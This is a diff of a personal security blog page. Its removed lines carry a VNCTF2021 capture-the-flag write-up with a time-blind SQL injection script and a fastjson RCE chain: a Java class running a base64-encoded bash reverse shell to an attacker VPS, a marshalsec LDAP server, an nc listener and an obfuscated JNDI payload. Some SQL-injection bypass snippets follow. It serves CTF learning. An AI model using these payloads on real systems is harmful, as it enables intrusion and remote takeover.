@@ -6,15 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>y0lo&#39;s blog</title>
+  <title>Python学习 | y0lo&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="you only live once">
-<meta property="og:type" content="website">
-<meta property="og:title" content="y0lo&#39;s blog">
-<meta property="og:url" content="http://yoursite.com/index.html">
+  <meta name="description" content="Python小程序最近学习python，打算写一些小程序，放到这里总结一下。 Python实现把图像转换为字符画1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&#39;&#39;&#39;pi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python学习">
+<meta property="og:url" content="http://yoursite.com/2021/03/12/Python%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="y0lo&#39;s blog">
-<meta property="og:description" content="you only live once">
+<meta property="og:description" content="Python小程序最近学习python，打算写一些小程序，放到这里总结一下。 Python实现把图像转换为字符画1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&#39;&#39;&#39;pi">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-03-12T14:53:32.000Z">
+<meta property="article:modified_time" content="2021-03-12T15:03:23.136Z">
 <meta property="article:author" content="y0lo-0924">
 <meta name="twitter:card" content="summary">
   
@@ -158,126 +160,24 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-VNCTF-realezjvav复现" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-Python学习" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/">[VNCTF2021]realezjvav复现</a>
+    <h1 class="article-title" itemprop="name">
+      Python学习
     </h1>
   
 
         
         
-<a href="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
-  	<time datetime="2021-03-16T13:11:37.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>自己太菜了，VNCTF没做出来几个题，签到即退场。</p>
-<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>简单的SQL注入</p>
-<p>fastjson Rce复现 </p>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>在Fastjson&lt;=1.2.47存在fastjson反序列化漏洞。</p>
-<p>关于Fastjson 1.2.47 可以看这篇文章 <a href="https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/" target="_blank" rel="noopener">fastjson</a></p>
-<p>这题根据提示Only the admin can get the right. 可以猜到用户名，password那里通过fuzz</p>
-<p><img src="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/image-20210316214000589.png" alt="image-20210316214000589"></p>
-<p>可以发现<code>&#39;#</code>的时候会返回200，sleep，空格，benchmark等都被ban了，本题用的是笛卡尔积时间盲注。</p>
-<p>payload:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> true:</span><br><span class="line">        j=head+(tail-head)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> j==min:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload=<span class="string">"-1'or if(ascii(substr(password,&#123;&#125;,1))&lt;&#123;&#125;,(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.tables C),1)#"</span>.format(i,j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">'admin'</span>,</span><br><span class="line">            <span class="string">'password'</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(url=url,data=data,timeout=<span class="number">0.7</span>)</span><br><span class="line">            min=j</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            max=j</span><br><span class="line">        sleep(<span class="number">0.4</span>)</span><br></pre></td></tr></table></figure>
+        <!-- 不蒜子统计 -->
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
 
-<p>跑出password，登录网站。</p>
-<p>这个图片存放路径<code>searchimage</code>存在一个任意文件读取。</p>
-<p><img src="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/image-20210316214845265.png" alt="image-20210316214845265"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;</span><br><span class="line">	&lt;version&gt;1.2.27&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>
-
-<p>通过pom.xml可以看到<code>fastion</code>的依赖</p>
-<p>再利用<code>ldap</code>协议进行攻击。</p>
-<p>利用自己的VPS开三个端口，并启动http协议，端口1用作恶意java类，端口2用作开启<code>ldap</code>,端口3用作监听反弹shell</p>
-<p>端口写一个java的<code>exp</code>，并进行javac生成类</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123; <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;<span class="keyword">try</span> &#123;</span><br><span class="line">Runtime.getRuntime().exec( <span class="string">"bash -c</span></span><br><span class="line"><span class="string">&#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwL3h4Lnh4Lnh4Lnh4L3BvcnQyIDA+JjEK&#125;|&#123;base64,-d&#125;| &#123;bash,-i&#125;"</span>); &#125; <span class="keyword">catch</span> (Exception e) &#123; e.printStackTrace();</span><br><span class="line">&#125; &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123; Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">&#125; &#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>YmFzaCAtaSA+Ji9kZXYvdGNwL3h4Lnh4Lnh4Lnh4L3BvcnQyIDA+JjEK</code>是一串反弹shell的base64。把这里改成自己的VPS地址和端口就好。</p>
-<p>然后执行<code>javac Exploit.java</code>产生class。</p>
-<p>在这个文件夹上启动http服务：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server port1</span><br></pre></td></tr></table></figure>
-
-<p>端口2启动<code>ldap</code>服务，先在github上下载 <a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a></p>
-<p>然后用<code>maven</code>构建项目:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>
-
-<p>进入<code>targe</code>目录，开启<code>ldap</code>服务：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http:&#x2F;&#x2F;x.x.x.x:port1#Exploit&quot; port2</span><br></pre></td></tr></table></figure>
-
-<p>端口3执行监听反弹shell:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp port3</span><br></pre></td></tr></table></figure>
-
-<p>payload:</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">roleJson=&#123;"name":&#123;"\u0040\u0074\u0079\u0070\u0065":"java.lang.Class","val":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"&#125;,"x":&#123;"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","dataSourceName":"ldap://x.x.x.x:port2/Exploit","\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074":true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/image-20210316220526132.png" alt="image-20210316220526132"></p>
-<p><img src="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/image-20210316220614741.png" alt="image-20210316220614741"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Python学习" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/12/Python%E5%AD%A6%E4%B9%A0/">Python学习</a>
-    </h1>
-  
-
-        
-        
 <a href="/2021/03/12/Python%E5%AD%A6%E4%B9%A0/" class="archive-article-date">
   	<time datetime="2021-03-12T14:53:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-12</time>
 </a>
@@ -298,6 +198,27 @@
       
 
       
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
     </div>
     <div class="article-info article-info-index">
       
@@ -305,16 +226,84 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/12/Python%E5%AD%A6%E4%B9%A0/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2021/03/12/Python%E5%AD%A6%E4%B9%A0/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          [VNCTF2021]realezjvav复现
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/03/11/misc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">misc刷题记录</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -334,552 +323,24 @@
 
 
 
-
-  
-    <article id="post-misc刷题记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/11/misc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">misc刷题记录</a>
-    </h1>
-  
-
-        
-        
-<a href="/2021/03/11/misc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="archive-article-date">
-  	<time datetime="2021-03-11T13:47:00.599Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="misc刷题记录"><a href="#misc刷题记录" class="headerlink" title="misc刷题记录"></a>misc刷题记录</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近刷了刷misc题，改变了自己原来对misc的看法，发现misc也超级有意思</p>
-        
-          <a class="article-more-a" href="/2021/03/11/misc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/11/misc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ctfshow内部赛" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/11/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/">ctfshow内部赛</a>
-    </h1>
-  
-
-        
-        
-<a href="/2021/03/11/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/" class="archive-article-date">
-  	<time datetime="2021-03-11T13:47:00.597Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="ctfshow内部赛"><a href="#ctfshow内部赛" class="headerlink" title="ctfshow内部赛"></a>ctfshow内部赛</h1><p>最近想多刷一些题，就先从ctfshow的题目下手吧。</p>
-        
-          <a class="article-more-a" href="/2021/03/11/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/11/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-算法学习" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/11/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/">算法学习</a>
-    </h1>
-  
-
-        
-        
-<a href="/2021/03/11/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/" class="archive-article-date">
-  	<time datetime="2021-03-11T13:24:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="算法学习之旅"><a href="#算法学习之旅" class="headerlink" title="算法学习之旅"></a>算法学习之旅</h1><h2 id="3-9算法分析学习"><a href="#3-9算法分析学习" class="headerlink" title="3.9算法分析学习"></a>3.9算法分析学习</h2><h3 id="欧几里得算法"><a href="#欧几里得算法" class="headerlink" title="欧几里得算法"></a>欧几里得算法</h3>
-        
-          <a class="article-more-a" href="/2021/03/11/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/11/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Log-injection" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/27/Log-injection/">Log injection</a>
-    </h1>
-  
-
-        
-        
-<a href="/2021/02/27/Log-injection/" class="archive-article-date">
-  	<time datetime="2021-02-27T06:54:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-27</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>环境：CTFshow web4</p>
-<h1 id="日志注入漏洞"><a href="#日志注入漏洞" class="headerlink" title="日志注入漏洞"></a>日志注入漏洞</h1><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>1、题目hint：日志注入 文件包含</p>
-<p>2、日志文件：本题中日志默认地址<code>/var/log/nginx/access.log</code></p>
-        
-          <a class="article-more-a" href="/2021/02/27/Log-injection/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/02/27/Log-injection/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-mysql数据库udf提权" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/23/mysql%E6%95%B0%E6%8D%AE%E5%BA%93udf%E6%8F%90%E6%9D%83/">mysql数据库udf提权</a>
-    </h1>
-  
-
-        
-        
-<a href="/2021/01/23/mysql%E6%95%B0%E6%8D%AE%E5%BA%93udf%E6%8F%90%E6%9D%83/" class="archive-article-date">
-  	<time datetime="2021-01-23T07:34:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-23</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="mysql数据库udf提权"><a href="#mysql数据库udf提权" class="headerlink" title="mysql数据库udf提权"></a>mysql数据库udf提权</h1><h2 id="mysql数据库udf提权步骤"><a href="#mysql数据库udf提权步骤" class="headerlink" title="mysql数据库udf提权步骤"></a>mysql数据库udf提权步骤</h2><p>UDF(user defined function)，即用户自定义函数。通过添加新函数，对MySQL数据库的功能进行扩充，就像使用本地MySQL函数如 database() 或 version() 一样。</p>
-        
-          <a class="article-more-a" href="/2021/01/23/mysql%E6%95%B0%E6%8D%AE%E5%BA%93udf%E6%8F%90%E6%9D%83/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/01/23/mysql%E6%95%B0%E6%8D%AE%E5%BA%93udf%E6%8F%90%E6%9D%83/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-SQL注入之万能密码" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/08/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/">SQL注入之万能密码</a>
-    </h1>
-  
-
-        
-        
-<a href="/2021/01/08/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/" class="archive-article-date">
-  	<time datetime="2021-01-08T03:36:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="SQL注入之万能密码"><a href="#SQL注入之万能密码" class="headerlink" title="SQL注入之万能密码"></a>SQL注入之万能密码</h1><p><code>&#39; or 1=&#39;1</code></p>
-<p>这是最简的万能密码了，今天记录一种看到的新的万能密码。</p>
-<p>当or、and以及注释符号被严格过滤时，便可以选择这种万能密码</p>
-        
-          <a class="article-more-a" href="/2021/01/08/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/01/08/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-SQL注入绕过技巧" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/07/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">SQL注入绕过技巧</a>
-    </h1>
-  
-
-        
-        
-<a href="/2021/01/07/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" class="archive-article-date">
-  	<time datetime="2021-01-07T06:18:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-07</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="SQL注入绕过技巧"><a href="#SQL注入绕过技巧" class="headerlink" title="SQL注入绕过技巧"></a>SQL注入绕过技巧</h1><h2 id="0X01-绕过空格（注释符-a0）"><a href="#0X01-绕过空格（注释符-a0）" class="headerlink" title="0X01 绕过空格（注释符/**/,%a0）:"></a>0X01 绕过空格（注释符/**/,%a0）:</h2><p>两个空格代表一个空格，用tab代替空格，%a0=空格：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20	%09	%0a	%0b	%0c %0d %a0 %00 &#x2F;**&#x2F;  &#x2F;*!*&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p> 最基本的绕过方法，用注释替换空格：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 注释 */</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/01/07/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/1206476-20170728221518555-1717045547.png" alt="img"></p>
-<p>使用浮点数：</p>
